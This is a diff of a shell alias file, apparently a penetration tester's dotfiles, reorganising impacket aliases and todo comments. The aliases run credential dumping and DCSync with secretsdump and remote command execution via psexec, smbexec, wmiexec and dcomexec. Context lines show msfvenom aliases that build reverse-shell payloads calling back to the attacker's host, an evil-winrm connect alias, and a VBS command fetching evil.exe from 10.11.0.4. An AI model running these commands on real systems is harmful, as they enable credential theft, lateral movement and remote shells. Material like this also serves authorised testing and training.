@@ -363,6 +363,20 @@ alias ssh-local-portfwd="ssh -N -L $LHOST:$LPORT:$RHOST:$RPORT $SUSER@$SPROXY"
 alias ssh-remote-portfwd="ssh -N -R $LHOST:$LPORT:$RHOST:$RPORT $SUSER@$LHOST"
 alias ssh-socks4proxy="ssh -N -D $LHOST:$LPORT $SUSER@$SPROXY"
 
+#impacket
+alias ip-launchsmbserver='smbserver.py NOPEROPE /offsec/stage'
+alias ip-secretsdump="impacket-secretsdump $RUSER:$RPASS@$RHOSTS -outputfile impacket-secretsdump"
+alias ip-dcomexec="dcomexec.py -object MMC20 $RUSER:$RPASS@$RHOST"
+alias ip-psexec="psexec.py $RUSER:$RPASS@$RHOST"
+alias ip-smbexec="smbexec.py $RUSER:$RPASS@$RHOST"
+alias ip-wmiexec="wmiexec.py $RUSER:$RPASS@$RHOST"
+alias ip-ad-dcsync="impacket-secretsdump -just-dc $DOM/$RUSER:$RPASS@$RHOSTS -outputfile impacket-dcsync"
+alias ip-ad-secretsdump="impacket-secretsdump $DOM/$RUSER:$RPASS@$RHOSTS -outputfile impacket-secretsdump"
+alias ip-ad-dcomexec="dcomexec.py -object MMC20 $DOM/$RUSER:$RPASS@$RHOST"
+alias ip-ad-psexec="psexec.py $DOM/$RUSER:$RPASS@$RHOST"
+alias ip-ad-smbexec="smbexec.py $DOM/$RUSER:$RPASS@$RHOST"
+alias ip-ad-wmiexec="wmiexec.py $DOM/$RUSER:$RPASS@$RHOST"
+
 # other tools
 alias evil-rm-connect="evil-winrm -i $RHOST -u $RUSER -p $RPASS"
 alias gcc-winpe='i686-w64-mingw32-gcc '
@@ -387,17 +401,6 @@ alias venom_asp="msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT
 alias venom_jsp="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw > shell.jsp"
 alias venom_php="msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw > shell.php"
 alias venom_war="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war > shell.war"
-#todo: smb-map
-
-#todo: impacket
-alias ip-launchsmbserver='smbserver.py NOPEROPE /offsec/stage'
-alias ip-secretsdump="impacket-secretsdump $RUSER:$RPASS@$RHOSTS -outputfile impacket-secretsdump"
-alias ip-dcomexec="dcomexec.py -object MMC20 $RUSER:$RPASS@$RHOST"
-alias ip-wmiexec="wmiexec.py $RUSER:$RPASS@$RHOST"
-alias ip-ad-dcsync="impacket-secretsdump -just-dc $DOM/$RUSER:$RPASS@$RHOSTS -outputfile impacket-dcsync"
-alias ip-ad-secretsdump="impacket-secretsdump $DOM/$RUSER:$RPASS@$RHOSTS -outputfile impacket-secretsdump"
-alias ip-ad-dcomexec="dcomexec.py -object MMC20 $DOM/$RUSER:$RPASS@$RHOST"
-alias ip-ad-wmiexec="wmiexec.py $DOM/$RUSER:$RPASS@$RHOST"
 
 # attacking resources
 alias serve-smb='ip-launchsmbserver'
@@ -537,9 +540,12 @@ alias usage-win-vbs='
 echo cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
 '
 
-### logstash ###
-### zeek ###
-### zfs ###
+#todo: smb-map
+#todo: crackmapexec
+#todo: logstash
+#todo: zeek
+#todo: zfs
+
 
 ### Conditional Aliases ###
 if command -v lsb_release &> /dev/null
